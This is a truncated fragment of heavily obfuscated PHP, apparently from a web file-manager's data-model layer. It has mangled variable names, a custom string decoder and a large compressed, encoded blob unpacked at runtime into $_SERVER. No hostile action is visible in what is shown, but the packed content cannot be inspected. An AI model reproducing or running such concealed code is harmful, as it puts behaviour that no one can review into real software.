(isset($ˆú€ƒİ[$ÈëµÔ‹Ô[2168]])) { $ˆú€ƒİ[$ÈëµÔ‹Ô[2168]][$ÈëµÔ‹Ô[551]] = $Íİ–ËŞâ[$ˆú€ƒİ[$ÈëµÔ‹Ô[2168]][$ÈëµÔ‹Ô[2158]]]; } } unset($ˆú€ƒİ); } private function metaList($Ã¨€¿Û) { $§á½ıÆ¿ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$Ã¨€¿Û) { return array(); } $…˜èƒØ§ = array($§á½ıÆ¿[2158] => array($§á½ıÆ¿[7], $Ã¨€¿Û)); $™ıˆ¢È„ = Model($§á½ıÆ¿[2169])->where($…˜èƒØ§)->select(); $™ıˆ¢È„ = array_to_keyvalue_group($™ıˆ¢È„, $§á½ıÆ¿[2158]); foreach ($™ıˆ¢È„ as $¢ÌÔÂÁà => $Êº³¼ı½) { $·ÀæÅ¾— = array(); foreach ($Êº³¼ı½ as $—İåÁã) { $·ÀæÅ¾—[$—İåÁã[$§á½ıÆ¿[95]]] = $—İåÁã[$§á½ıÆ¿[451]]; } $™ıˆ¢È„[$¢ÌÔÂÁà] = $·ÀæÅ¾—; } return $™ıˆ¢È„ ? $™ıˆ¢È„ : array(); } public function removeTarget($…‡¶ÕÓ, $†À×ı¡‹) { $ÀÂÕÃ…Í =& $_SERVER[¿ÈˆÑ¸ä]; if (!$†À×ı¡‹) { return !0; } $†À×ı¡‹ = is_array($†À×ı¡‹) ? $†À×ı¡‹ : array($†À×ı¡‹); $Ş†ñ±Óã = array($ÀÂÕÃ…Í[189] => $…‡¶ÕÓ, $ÀÂÕÃ…Í[585] => array($ÀÂÕÃ…Í[7], $†À×ı¡‹)); $–ø•¿å = $this->field($ÀÂÕÃ…Í[2158])->where($Ş†ñ±Óã)->select(); $¾¡ÙÏ¤™ = array_to_keyvalue($–ø•¿å, $ÀÂÕÃ…Í[12], $ÀÂÕÃ…Í[2158]); return $this->removeArray($¾¡ÙÏ¤™); } public function removeArray($¼½¤ó¡Â) { $çĞˆ›¾ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$¼½¤ó¡Â) { return !0; } $¼½¤ó¡Â = is_array($¼½¤ó¡Â) ? $¼½¤ó¡Â : array($¼½¤ó¡Â); $áˆÒœÚ = array($çĞˆ›¾[2158] => array($çĞˆ›¾[7], $¼½¤ó¡Â)); Model($çĞˆ›¾[2161])->where($áˆÒœÚ)->delete(); Model($çĞˆ›¾[2170])->where($áˆÒœÚ)->delete(); return $this->where($áˆÒœÚ)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\x6c\x65\x5f\143\157\156\x74\x65\156\x74\x73"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\124\151\x6d\145", "\x74\151\155\x65", "\151\x6e\163\x65\x72\164", "\146\165\156\x63\x74\151\157\x6e")); } goto B´ù¹Ÿµ–â; cŠ‚Ãí¬î: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('v8iI0bjk'), base64_decode('5/728c+i')); $_SERVER[¿ÈˆÑ¸ä] = explode("\174\2\174\5\174\4", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x79\x7c\x1c\xc5\xb1\x38\x4e\x20\x81\x18\x48\x20\x21\xe1\xf1\x1e\x9\xc\x2\x5b\x92\xbd\x87\x2c\xdf\xb2\x65\xb3\x92\x56\xd6\xe2\x95\x56\xec\xae\x7c\x20\x89\xf1\x68\x77\xa4"."\x1d\x6b\x77\x67\xbd\x33\xab\xc3\x36\x84\xfb\x3e\xc3\x4d\x38\x3\x4\x92\x60\x3\x9\x87\xb9\x21\x10\x12\x72\x90\xb\x48\x80\xf0\x25\x1\x24\x9b\x84\x40\xe0\x25\x24\xe4\x11\xf8\xf5\x51\xd5\xdd\x33\xbb\x82\xf7\xfb\x7c\xff"."\370\372\143\173\247\357\356\352\352\352\352\352\252\352\67\376\262\373\217\67\377\151\333\236\333\76\263\355\323\117\334\367\203\355\327\277\306\277\267\355\105\376\377\14\377\76\374\334\317\356\301\376\34\164\356"."\71\15\15\135\213\367\235\327\263\377\205\167\157\67\166\30\333\215\363\23\361\237\376\54\366\271\147\156\77\46\72\175\323\117\47\247\77\265\307\43\227\154\176\240\205\144\346\145\133\370\217\126\264\135\315"."\x9c\xb0\x1c\xd7\xe1\x11\x19\xbb\x38\x6c\x8d\xf0\x6f\xab\xc8\x7f\xc3\xfc\xa7\x2f\x19\x2f\x9b\x5\xdb\x35\x79\x30\xc4\x7f\x74\xe8\x17\xfb\xdf\xd9\x9c\xb7\x30\x5d\xef\x49\xa4\xf5\x54\x5f\x6f\x6f\x34\x99\x86\x4c\x2d\x6a\x7a"."\301\316\302\127\311\50\33\5\150\277\144\226\35\322\33\265\72\275\144\227\314\242\47\106\106\144\15\327\30\62\34\250\251\243\115\357\210\366\306\23\33\364\364\206\336\50\344\30\322\67\127\314\362\44\17"."\xb1\xcf\x94\x6b\x94\xdd\xb4\x55\x30\x45\x8e\xf1\xb2\xe8\x57\x5b\x74\x75\xac\x47\x4b\x27\x23\x3d\xa9\x48\x7b\x3a\x96\xe8\xe1\xd1\xed\x89\xee\xee\x58\xba\x3a\x3e\x99\x88\xc7\xdb\x22\xed\x6b\xaa\x53\x7a\x93\x91\xd5\xdd\x11".base64_decode('jfQvb+pWcdhu0DbylI1aI//otMx8ln8WDeyOO1mCr7T4ItNUrOTzPNAjvrLmsFHJA7Q61ECpbA==')._kodDe('LvwF5AxjCrRC/+LSk0bKsyHB86f5uFzCaPzHWIn4o5VF4ZJrWJNKxA2DKl55Fv1QkZ4oxkllxjU=')._kodDe('MT6AY3qip3qLS6Jp8A7WvY3eDyOl+kBGm04VqSJ6Of+3e7Y/VchYNo1S9S/ZG641c1EaShOYkr4=')."\144\222\177\4\0\275\343\61\72\151\20\110\164\166\246\242\42\4\203\73\66\116\172\262\0\360\323\23\312\16\347\135\175\314\310\127\20\115\107\371\157\75\374\300\257\355\0\352\156\266\212\126\5\320\24".base64_decode('qrBtsazgo4K5TYwxs/BRIOVtKDcEcUOYaxN+WGSFjvHP1pX8dzmUH9Jpmll2dbOYsbNWEdbxKg==').base64_decode('wEfDzXWULZKBh4ftfBa/HWsLjHLYyps9lYKaRQQzOSufLePS+7icPBgXK5nmlaES6YkgAtbwpA==')."\134\212\64\137\257\110\165\354\112\71\143\306\310\322\341\341\371\20\155\272\56\31\34\2\304\356\53\345\155\43\233\62\313\142\150\226\335\111\52\112\124\134\65\162\24\127\101\126\1\102\270\241\377\344\340".base64_decode('h4P9R5P/GoHQDUAzOTOf180JE5ZJIbvIwfGFnSGrGCYxPBhL6DnDyXVnF+msFNLPrDkRKuVKsA==')."\206\305\262\35\360\240\61\205\106\217\355\106\25\52\234\267\63\6\344\255\260\301\361\357\234\353\226\122\146\61\113\7\7\103\261\307\213\154\360\45\323\204\114\35\1\55\253\165\153\33\264\256\26\253\305"."\301\202\205\274\370\302\321\211\70\107\104\272\23\70\103\331\141\100\100\334\4\352\240\101\313\141\364\114\56\106\243\124\312\133\31\303\265\354\142\330\316\270\246\33\164\334\262\151\100\215\221\114\306\164\234"."\140\273\135\164\313\166\76\30\311\347\355\361\140\242\154\215\130\305\26\155\56\220\126\222\110\226\160\220\222\273\26\130\227\165\313\65\212\13\264\231\271\255\25\167\70\270\24\327\233\310\135\66\212\316\260"."\131\16\106\1\331\133\64\322\131\101\363\60\133\207\345\224\154\307\242\335\153\321\14\327\65\62\71\112\57\144\365\255\37\223\337\52\346\255\242\131\235\227\124\142\6\173\313\306\110\301\150\321\112\225\41".base64_decode('AgBYYxCXoTnUzACAFq1gTASNEawpOlGyyqaDo9ZWd6cBo4aD3XRtWGY2mCIEGSpb0LRQI7iiYQ==')."\32\217\355\112\247\173\365\130\47\331\161\173\242\172\167\44\335\336\5\265\273\306\10\126\35\47\144\126\124\211\221\353\203\144\215\120\154\352\41\203\223\221\275\366\270\131\46\15\267\115\266\150\243\166\166"."\310\236\10\141\22\315\234\42\304\2\63\323\371\55\271\301\244\121\34\241\303\30\232\164\115\307\117\156\332\310\376\34\32\346\13\62\64\144\16\333\145\30\215\63\66\342\5\176\334\54\216\270\71\254\73"."\x15\x4d\xae\x8d\x26\xf5\x54\xa2\x33\xbd\x2e\x92\x84\xed\xbc\x48\x30\x67\x2\x7b\x43\x5b\xcf\x7\x93\x66\x96\x0\x31\xe3\x62\x39\xa3\x24\xa1\xbf\x3e\x48\x17\xc\x6d\x1c\x53\xe9\x22\xc2\xb4\x78\x6c\x35\x85\x5d\x47\xd0\x21"."\x99\x82\x6a\x2e\xac\x3b\x6e\x15\x2c\x3a\x3c\x57\xa4\x30\x60\x93\xbd\x7e\x35\x74\x28\xcc\xc6\xdc\x3a\xe0\xcc\x6d\x18\xc8\xce\x6b\xc\x92\xff\xe7\x36\xf6\xf\x74\x84\xe6\xe\xae\xa\x5b\xb2\x4c\x78\x7e\x68\xbe\xd6\xdc\xb4".base64_decode('WOslzIdl5DUYdFWOJi2xxgsWieFFu2jWXFgEkWzHDHaZBqG7ZCI88xLAtnj4Y6BLtz+FlvjmhQ==').base64_decode('Ryajx/ZFU2m9O5ruSnRA96MR+CqSwqy/OMeU14KdrgjVmhPKtiDJe0YFCCvXY48jQfchUHvOzA==')."\214\316\220\106\276\140\64\66\247\113\70\165\375\374\147\20\260\171\220\377\350\172\173\74\32\111\352\300\244\352\226\323\251\354\214\64\50\310\255\156\17\155\42\210\326\155\272\206\34\0\151\56\126\40\113"."\132\16\104\367\156\143\70\312\156\211\370\144\5\255\263\262\142\237\43\301\56\323\32\311\101\277\55\132\135\306\316\333\145\43\117\267\2\144\115\107\54\240\312\245\174\205\54\203\60\255\70\235\253\24\206"."\140\343\42\40\33\61\135\311\65\72\223\204\265\52\340\236\113\66\156\67\326\341\331\131\41\24\326\51\352\16\204\112\305\221\306\243\240\56\275\171\121\23\215\200\131\205\221\21\366\271\142\126\17\75\224"."\xb1\xc9\x3a\xef\x36\x46\xcd\x16\x3a\x16\x20\x6e\xcb\x59\x2c\x6\x14\xfa\xb9\x9c\x6e\x79\xad\x7e\x32\x41\x67\x2b\x1f\x2a\x90\x4a\x58\x9d\xed\xb6\xd8\xa4\xf9\x1\x65\xb9\x77\xcb\xd3\xcc\x72\xd9\x2e\x1f\x1\x39\xd8\xb7\xc6"."\366\115\72\135\120\271\53\30\13\207\120\4\374\316\331\202\21\261\21\67\133\302\60\356\331\315\235\100\105\262\204\41\13\71\56\231\4\62\100\43\233\255\25\115\50\17\124\260\15\321\226\45\40\133\20".base64_decode('Ti0gfyUPkLULBu6olBCJZmnAESG2TZpZvk96ovgC51Fzscmya9PEsicnQdKcDZ0mWAEDroiRIw==')."\xc\xb2\x66\xde\x44\x4\xcb\x99\xc8\x6a\x34\x41\x36\x32\x33\x2\xfd\x86\xc5\x3a\x20\xe7\x3\x12\x2b\xd9\x36\xcb\x49\x92\x92\x94\x31\xc0\xf0\x3a\x7a\xa0\x92\x11\x94\x3b\x2\xbc\x92\x9f\x79\x32\xab\x9\xb6\xa0\x64\xb8\xb7"."\154\16\133\23\110\112\46\334\156\243\74\212\3\43\45\345\122\244\1\145\231\166\366\305\343\172\173\242\47\115\316\143\74\146\135\62\226\216\42\305\212\164\350\221\366\136\10\111\32\50\30\70\225\5\341"."\x31\x63\xcd\x80\x42\xa4\x13\x61\xc9\x2b\x91\xcd\xba\x64\x17\x9\xa5\x5\x62\x15\x94\xa7\xb5\xaa\xa4\xac\x64\x25\x0\x77\x24\xfb\xe1\xe3\x28\x8\x4f\x50\xd8\x12\x2c\x10\xba\x12\x14\x7d\xea\xed\x3\x5e\x0\xb1\x2\x39\xdd"."\266\311\116\273\214\154\234\65\122\134\53\146\176\135\152\141\260\253\73\322\36\114\165\105\232\27\55\346\261\33\12\331\201\164\227\345\14\34\47\302\320\235\161\147\241\136\66\311\232\106\134\150\156\232\217"."\53\216\360\45\206\354\371\206\140\41\110\153\241\54\145\250\251\251\11\353\232\267\130\313\21\122\42\350\167\226\215\26\17\57\225\314\250\251\222\163\47\70\156\41\315\73\112\260\343\107\125\3\337\251\260".base64_decode('3U03MrQ6nRR2K44KKYKAWVLEQi6Zxxr5EZvgXa6gRmYF/vKwyVkuaChnCDhR6OHiIAzdpFqIgg==')."\231\364\1\351\267\227\307\326\322\265\1\315\131\367\30\100\133\366\243\104\167\66\102\265\161\332\346\360\237\175\241\33\25\262\156\313\326\26\5\372\253\260\46\244\231\211\24\64\71\121\310\313\143\25\200"._kodDe('K5P5AZw1YBwaly1d24o99pP+KxDQKLEqtBFyVapcCA5ENZauDU3LMjJHx9SiplSxqNAi6zxI5x4=')."\367\135\321\156\27\112\224\254\164\127\362\256\105\307\313\61\167\45\214\161\5\345\201\60\320\353\3\107\64\155\300\256\263\42\254\346\133\21\236\251\126\30\12\145\314\326\353\275\361\110\272\63\221\354\6".base64_decode('HC+VJFqVMrVWW1BSpIoTNCmfDKvAyOR9KKrCYn1NTFxfCxPX+zBxfTUmrq+FZ2OAkEbB2GIXyQ==')."\172\45\33\155\41\224\1\264\110\167\305\172\326\350\335\211\216\150\134\217\365\20\176\56\135\35\337\327\333\21\101\62\250\306\267\45\322\135\236\330\76\302\321\255\215\304\143\376\354\321\365\261\124\72\125"."\63\211\304\365\105\175\51\35\155\172\157\62\332\31\133\57\202\235\261\150\274\43\245\267\107\332\273\144\236\236\110\67\4\10\257\144\346\263\116\330\233\137\47\254\151\112\110\322\164\100\70\10\171\204\127".base64_decode('OopldEmJyTHHhOmA4VJZJBuJjqSqIhhNPNMXcKslRzQAO55PGvhPoxZJaW5JF5vq0KT4ZMPAsA==').base64_decode('jswkYUegIxrwy1Vd0WmeNuVUVDsiMuwKltQXJnuJTCNTEWHST4ISbGqgGYvsTGU3gt0ZlpJHPQ==').base64_decode('0RtNRqjcUl+XTPSshgLjORM7EIN5aMBjKogvXbnBG3nLQDmWhP4mG2FKjubI/BcR4EOUu0GWFw==')."\x3f\x86\xc9\x8a\x46\xce\xc4\xae\x88\xfa\x87\x6c\x1b\xea\xcc\xd3\x13\x19\x54\xef\x20\x4e\x4c\xe0\xfe\x3c\x4f\xec\x5f\x80\xa9\x89\x35\xd1\x1e\x1d\x11\x89\x87\x14\xe4\xe3\x11\xd1\x64\x32\x91\x84\x61\xbb\xf6\x28\xa\xb8\x78".base64_decode('YjKaiqZxh99csRAo4dA8QFqT8HTQfPj4gfF5Df3BeaFB8tE492gehNBAyBNEVrtSFqUpG9jgrA==')."\152\154\31\10\17\204\33\126\265\364\107\202\133\214\340\226\246\340\262\340\40\141\320\33\347\101\304\340\326\346\300\302\23\150\6\222\161\325\221\203\344\247\165\140\325\354\201\340\234\23\67\36\335\77\60"."\x58\xdf\x32\xef\x88\x81\xd0\x91\x3\xe3\x83\x73\x1b\x57\x61\x3b\x99\x4a\x99\x9c\x1\x70\x63\x23\x5d\xcd\xce\x6b\x20\x5d\x22\x87\x56\x91\xa5\xa8\xd0\x61\x96\x1\x13\xb6\x58\x25\x19\xbb\x75\xf1\x9\x18\x4f\xe6\xcd\x1c\x91"."\x25\xfa\x83\x3\xf3\x6\x57\x29\xe5\x94\x28\x7f\x5b\x84\x94\x12\x8e\x2f\x27\xf2\x45\x82\xc7\xd1\x91\x89\xa2\x74\x99\x3\x4e\x54\x8a\x19\xb9\x1b\x52\xec\x1f\x32\xc4\xe9\x6f\xa4\x28\x8f\x55\x6e\x59\x8\x3d\xc7\x8\x46\x4a".base64_decode('grt1Nv89ASdyxJxASlActpCbqhStzXi+KZqb4cN2BRab7riJ6EHiPWGCHLgJkCQllFc2DSbKEg==')."\70\52\220\311\52\351\364\250\67\56\102\144\117\201\171\232\5\271\235\214\121\62\123\312\10\165\75\35\151\213\107\305\271\25\10\57\206\31\21\154\23\127\43\144\150\222\200\42\25\120\304\124\114\154\4"."\353\333\331\234\327\330\362\347\147\254\26\166\113\344\124\112\364\270\244\221\31\47\260\325\10\373\246\265\256\324\70\310\241\234\256\116\100\111\34\203\250\234\323\224\13\235\322\41\350\123\111\316\220\103\216"."\x21\x78\x10\x8\x37\xc\xc\x54\xfa\xcd\xec\x60\x3f\x41\x7c\x23\x38\x3c\xb8\x75\xc1\x9\x8d\x28\x4b\x9\xf\x90\x3f\x18\x88\xd4\xb8\xaf\xd0\xd\x17\x41\x22\xa8\x9f\xbe\x3a\x9a\xe\xd1\x1e\x9\x9\xb5\x27\x20\x92\x79\xd0"."\x2e\x8b\x73\x45\xc9\x73\xb0\x77\x6d\xd7\xc8\x7b\xaa\x48\xd3\x18\x24\x4c\xc8\x4a\x81\x60\x97\xcf\x7b\x5c\xd2\x2b\xca\x71\x28\x57\x3e\x8c\x7c\xf6\x8\x41\xaa\x60\x88\x95\x3b\x7\x5a\x22\x65\xba\x21\x91\x23\xa0\x24\xea\x24".base64_decode('rBJrcc3DQmtlRlYGqLNG/qzrivYgKU8r361aeyQVxRCwXftGezrgOoX/D0woZFu+L24oRbKY2w==').strrev('ÎÑb±Œ­nnº|‚çF'."\n".'c’Šµy±¡•\\*Vt(Öò‚HWyòVuÉœ£Lr›¹áLSéK•}•').strrev('úÿX‚:ÆdÁdÓp£¥Mb*J6B7´T“8G^À<Ê4zF"[Z=bÑÖ¼µ¥;ÂÕôw.ˆ©')."\x20\xa\x56\xc4\x87\x5d\xe2\x7\x19\xd3\xd5\xf3\x36\x92\x2e\xaf\x48\x86\x9e\x6\x3\x54\x30\x12\xa0\x8c\x4c\x80\xf4\x3a\x40\x65\x29\x1\x79\xd6\xe\xc8\xdb\x92\xc0\x98\x65\x8e\xb3\xf\x71\xe\xe\xc0\xf1\x38\x20\xa5\x40"."\xf0\x19\xeb\x8\x58\x4e\x7\x3b\xe6\xb3\x6\x58\x12\x76\xc1\xcd\x51\x89\x77\xde\x98\xc\xf0\xee\xc4\xcd\x31\x33\x1f\x40\xf9\x50\x0\xfb\x18\x40\xa9\x58\x80\x49\xb3\x3a\xa0\x5b\x7d\x64\x31\x43\xb7\xd8\x27\xa1\xd9\xb9\x0".base64_decode('RVq6ZgLy/iZgjxfNMssCYJMSgoCUHgRGynal1IttKiHeLYiQfRYRSdt2AyhoC6gSN+hFBNdmTQ==')."\x70\xd6\x1e\xd\x83\xbf\xbf\x13\x80\x5f\x34\xa9\x1a\x4a\x9f\x30\x59\xd5\xf3\xe1\x15\x36\x6e\xe5\x35\x82\xa0\xf5\x4\xdc\x63\x3d\x79\x98\xd0\x4f\xb0\xba\x14\xe0\xf2\x4b\x59\xf3\x74\x0\x9d\x6\xdc\x14\xf2\x6a\xd5\x6f\xc4"."\x3a\xdc\xd9\x10\x8d\xe5\xbd\x8e\xbc\xa4\x93\x8c\xb5\x5f\xee\xe3\xbf\xbe\xa3\x8d\x92\xd3\x5b\x4a\x69\xce\x35\x46\xb0\x2d\x4a\x20\xc5\xd9\xae\x46\x56\xfe\x9d\x34\x33\x93\x19\x29\x48\xea\x50\xc4\x53\xde\x90\x80\x3e\x5b\x39"."\265\260\276\366\254\12\114\26\223\260\357\254\131\10\125\104\157\61\243\236\125\361\311\353\21\106\302\210\136\242\44\231\26\336\131\112\354\123\144\23\355\314\43\30\232\325\144\40\363\1\157\210\56\247\20"."\x23\xe1\xec\xa\x3c\x25\x64\x96\xf1\x68\x67\x5a\x3b\x26\x41\xe8\x95\x65\xeb\xbc\x8c\x4e\x33\x6b\xec\x3f\xbb\xa8\x79\xea\x46\x70\x11\x2a\xcf\x6a\x14\x61\xa3\x98\xe5\x31\x1b\xc9\x7e\xb2\xb1\xb5\xe\x1b\xa9\xf3\x14\x97\x88"."\xe1\xed\x44\x0\x83\x5a\x35\xaa\x51\x70\xab\x40\xa0\x8\xc0\x86\x2f\xf7\x40\x8c\x4a\xc8\x2d\xb7\x2\x9c\xa6\xe1\xc0\x11\x8f\x4a\x7c\xe1\xcb\xc4\x38\x39\xb5\x2a\x26\x2a\x4\x46\x46\x60\xbf\x3c\xed\xd2\xa0\x5c\x45\x88\x12"."\32\155\40\240\360\106\224\210\4\345\172\120\202\136\220\373\60\322\267\121\123\20\365\132\305\111\253\230\262\250\4\303\37\13\13\233\165\241\327\160\234\161\302\200\300\276\67\167\356\134\115\262\2\222\23".base64_decode('oatdhjjSzvTNdxUq5eDNB+CuOpC3iqPKji2Fq2RwtKgyNKjJNzCoSMkiAQQLHBZEzihLWCNZog==')."\264\101\214\301\241\131\144\120\311\66\154\214\111\56\311\123\106\41\56\216\73\211\275\127\77\275\225\362\140\107\200\375\166\221\316\7\52\244\227\214\36\307\11\54\310\17\353\150\332\226\244\235\177\364\262"."\x7d\x99\xac\x6f\x92\xc4\xf7\x72\x67\x6\x42\x40\x27\x86\x8a\xe4\xd4\xcd\x8f\x37\x67\x65\x5\x4\x68\x63\xb8\x7c\x2a\x85\xe\xb8\xd1\xa0\xdf\x6b\x9\x1d\x51\x59\x6\x47\xe9\x78\xa2\x22\x8f\xf9\x39\x2b\x4b\x8e\x8\xba\x8a"."\167\362\302\211\111\67\32\220\204\1\3\243\53\62\17\101\2\275\54\10\47\300\21\261\245\220\23\112\236\354\240\345\20\135\245\253\351\76\210\140\347\4\126\155\75\145\22\170\100\365\262\206\124\125\232"."\232\133\212\56\351\26\43\267\44\161\41\50\26\271\234\102\271\242\107\144\207\350\54\352\325\375\240\163\121\73\334\131\266\5\23\57\270\11\177\246\166\166\136\26\72\53\76\16\100\201\207\207\153\251\212"."\x52\xca\xf8\xf9\x17\x5f\xac\x2f\x48\x79\x9a\x1a\x5b\x1d\x74\x93\xdd\x43\x95\xf9\x66\x19\x22\xa7\x1f\x50\x3d\xa\x34\x29\xac\x9d\xa4\x70\x5b\xf9\x5d\x20\x6c\xae\x27\xf8\xe6\xd7\xb5\x6d\x72\xa4\x2e\x87\xca\xa4\x45\xd9\x11"."\205\272\2\355\141\272\52\51\143\330\124\31\22\117\142\244\124\222\335\26\365\73\244\210\262\203\170\71\62\254\63\125\62\160\343\320\202\232\257\6\243\124\122\333\24\354\44\42\74\73\160\125\104\204\6".strrev('„Æ\\Ğ›˜µœÙ:#hU›m†ıÕ†X_İíÊ3&QxÛt1¥ËY¢¼Jqx.!<¯¢HrÔ|½W').base64_decode('JC9WW2krY5fw6FdWFCzHTCWS3lmWZIoS5MlKkqxUySWmgvWIrMws4+AlFFheKMuED3zxh+iBJw==')."\xa4\xee\x22\x91\x72\x19\x51\x9f\xf\x93\xde\xa7\x93\x48\x35\x8a\x12\xe7\x14\xae\xdb\x5a\x7b\x2d\xaf\x3c\x3a\x26\xd5\x14\x79\x55\xb4\xe1\x10\x27\x1c\xf4\xd2\x36\x51\x14\xeb\x45\x7e\x57\x67\x55\xc5\xad\xb5\x2b\x4a\x49\x3d".base64_decode('Bm+odvZIPt9hYF/94RmLcIKhFlJjZizWyc7eqLRRK06cumY+SfiVB7xEfmZ+awbyKKexdpiwDg==')."\355\71\253\150\242\174\152\330\52\73\265\250\335\377\143\306\276\32\362\164\205\314\204\56\64\115\21\314\123\165\351\61\123\75\342\10\271\264\44\125\202\347\250\342\224\200\133\121\2\272\353\141\370\222\254"."\x7e\x65\x39\x79\x30\x84\x2c\x5f\xe\xf\xba\xd9\xc5\x12\x21\x67\x6\x9c\xf5\xe7\x13\x6a\x3a\x8c\x26\x4e\x88\x3d\x5a\x2d\x44\x93\xe8\x5c\xaa\x95\x4a\x6\xf3\x63\xf2\x8b\xca\x25\xb3\xa9\xe6\x23\xb8\x4b\x13\x66\xea\x2b\x26"."\213\132\376\371\217\351\233\36\177\236\177\377\340\305\73\236\70\343\42\200\326\26\173\144\2\11\55\134\242\221\377\367\334\266\67\377\226\252\363\247\257\357\267\17\375\321\227\367\376\327\57\317\374\160\337"."\xfa\x7b\x67\x45\x3f\x67\x1d\x73\x73\x28\xbf\xf1\xb1\x2f\x85\xbf\x38\xfb\x9c\xfb\x6e\x39\xaa\xbf\x78\xf7\x21\x6f\x3d\xf3\xf5\xd1\x67\x9e\x9\x8c\x8f\x44\x93\x7f\x3f\xf7\x57\x8b\x37\x1f\x96\xbc\xf9\xb6\xfd\x9e\x8d\x9e\xfb"."\174\356\344\203\163\231\175\162\27\153\263\376\145\177\147\315\207\321\221\361\320\203\153\236\376\166\141\142\327\65\313\26\70\317\134\365\366\300\31\367\337\272\152\343\327\276\266\264\43\273\107\357\1\75\173"."\356\376\315\357\367\70\356\311\123\267\355\375\207\167\366\377\322\336\247\77\167\331\257\277\365\207\235\305\360\143\333\336\374\346\306\334\255\117\155\72\347\243\127\142\237\175\363\300\346\351\43\377\364\302\23".base64_decode('R/xt6cUtoX0Cc+uPPvrs+vsu+cZX/nb1Ye5nT58f2/Oem9f9+bBn737kxF+Olp5qPfQbpcud1Q==')."\x6f\xb5\x3e\x3e\x71\xcd\x2f\x2e\x3f\xfa\xbd\xdb\xaf\x69\xfd\xf0\x8d\xd6\x7f\x3f\x61\x3e\x3d\x7d\xfd\xbf\xc7\x2e\x3b\xe0\xee\x95\x1f\x5d\x3e\xef\x9d\x1b\x7e\x55\x7c\xe7\x9d\xb1\xef\x3f\xdc\x57\xfc\x53\x6c\xed\x1f\xda\xc3"."\343\233\236\260\56\330\371\354\234\337\45\66\124\26\277\233\130\262\337\251\227\235\142\174\371\240\167\317\152\172\45\167\262\161\364\53\273\362\173\355\365\165\375\27\167\234\372\370\306\340\33\317\175\345\243".base64_decode('hYXrny/c/LOvvnqV3fabPc9oDN36YmTj51vfeu8rCzuz6/Kfe/lTL9x5zPuL1r944OJnTtj32g==')."\261\233\303\273\376\371\205\133\77\363\225\53\157\376\356\57\227\54\75\377\210\205\363\216\314\235\67\357\311\57\325\235\361\366\206\257\136\370\362\231\221\323\177\360\330\77\156\175\162\301\326\117\175\261\356"."\xf3\x4f\x7e\xea\xf0\xd\xf7\xee\xfa\xcd\x19\x4b\xf3\xfb\x1e\x58\x7e\xfc\xc0\xc5\x67\xb7\x9d\x95\xbd\xeb\xa0\x1f\x5d\xba\x33\x96\x5f\x7c\xde\x97\x36\x5c\x7c\xd8\x6b\xaf\x7f\xbe\x72\xe0\xad\xad\x4b\xb3\x3d\x5f\x9c\xb3\xfc".base64_decode('sc5/3z/vxnzL4rcuvOHu4o8veu29z9541+PPnnrnX9reuOALf914/ZtPNLdlXxxxzj79hKbzfg==').base64_decode('9+tNLS/e1Z0K/bC05bEdO3suagyvufMnOw59Yrnx4KyG2w/6xafaJi+Jz697bMW9L+/7vSMeeQ==')."\246\370\342\5\301\373\17\73\144\355\17\177\126\371\374\45\17\77\23\277\175\372\267\277\77\365\251\337\37\35\373\357\113\336\334\367\224\307\56\51\36\221\72\243\355\167\167\277\263\364\347\57\54\371\355".base64_decode('F6/bb9dBoeSKWy541f30cN0bV7/26/e7X8qf+fQb3zr76m9/8NjJT2wbuOeEpos+e96TL33q/A==').strrev('åÄu#«ü?ÏkşE7µËdcøogïbq|\'#òøÿÍÃd</K-üğxÿúxYÿ³÷Cóõ›')."\xf6\x71\x87\x35\xdf\xb6\xec\x4f\x3f\xf9\x8f\x2b\xef\x72\x4f\x7b\xe2\xa2\xdb\xcf\xcb\x67\x43\x27\xfd\x6b\xce\x23\xd3\x7b\xee\x35\x27\x74\xe2\xc9\x2f\x9c\x76\xeb\x81\x3f\x9c\x78\xfe\xa4\xcf\xdc\xf4\xf4\x7f\x5d\x30\x68\x1d"."\230\177\241\375\306\103\156\176\366\251\366\356\354\254\375\76\335\160\113\363\341\347\236\166\345\161\165\15\177\170\361\330\117\377\355\351\365\247\204\206\215\37\236\373\352\225\7\334\164\351\206\330\356\243\17"."\x19\xd8\x7a\xf6\x95\xfa\xcd\x91\x89\xfb\xae\xfd\xc2\xe3\x7f\x1d\x7e\x71\xa4\xf3\x4f\xb1\x5b\x66\x1f\xbc\xcc\x8e\x3f\xa9\xfd\xec\x2f\xb1\x45\x37\xdd\x7c\xed\xc6\x8e\x59\xad\x73\x17\x6f\x32\xda\x9f\xfd\xfa\xf6\xef\x3d\x7f"."\333\356\153\313\137\133\235\377\114\353\365\223\67\237\221\110\271\373\337\123\76\347\321\275\76\370\325\242\316\375\217\32\76\360\360\363\56\375\112\123\367\145\346\225\277\377\166\341\261\107\266\227\133\106\166".base64_decode('X7rZnfvYwI63lhy35f4X8oe/cf7iXV997t6/Hf/gy4nf/ceXl376r6WLr3ggM++iudufLM969g==')."\xf4\xa3\x7e\x73\xfd\x41\x77\x1d\x71\x44\xff\x8f\xe6\x7e\x79\x9f\x4d\x75\xcf\xde\x9d\x48\x86\xba\x46\x7f\xf1\x99\x85\xc5\x2b\xe3\x9f\xfe\xe3\xce\x93\x83\x47\xbc\xbb\xc0\x78\x68\xe7\xf6\x7c\xf2\x98\xd1\x6f\xcf\x3b\xf4\xa2".base64_decode('q067/7UDr1lw1vKRh39y1vSBBz154t2ZgQMOnfeN5nU/OenRe3+Z/vVvv7U+cOzGhwo3rvnWLw==')."\x5f\xba\xfa\x51\x73\xac\xe3\x2b\x87\x5c\xfe\x93\xfb\xe2\xcb\x2f\x3a\xa5\x75\xe9\x1\x27\xbf\xf9\xb5\xb\xbb\x6\xde\xdf\xd1\xfd\xda\xdb\xd7\x7f\xe7\x91\x97\x6f\xff\xeb\xf4\x21\x9d\x7\x1d\xf2\x85\x67\xd6\x3c\x75\xe6\x3e"."\x97\xfd\xf4\x9b\xc6\x9a\xcb\x67\xb5\xdf\x73\xf0\xab\x3b\x32\xa7\x9d\x